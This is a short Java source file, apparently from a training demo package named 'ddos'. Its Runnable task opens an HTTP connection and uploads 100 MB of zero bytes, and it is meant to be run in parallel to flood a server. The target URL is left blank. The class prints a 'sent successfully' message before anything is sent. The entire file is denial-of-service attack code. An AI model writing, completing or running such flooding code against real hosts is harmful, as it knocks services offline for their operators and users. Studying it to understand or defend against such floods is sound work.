package cn.itcast.demo00_ddos;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

public class Task2 implements Runnable {

    @Override
    public void run() {
        try {
            System.out.println("发报成功");
            URL url = new URL("http://");
            URLConnection con = url.openConnection();
            con.setDoOutput(true);
            OutputStream out = con.getOutputStream();
            out.write(new byte[1024 * 1024 * 100]);
        } catch (MalformedURLException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
}
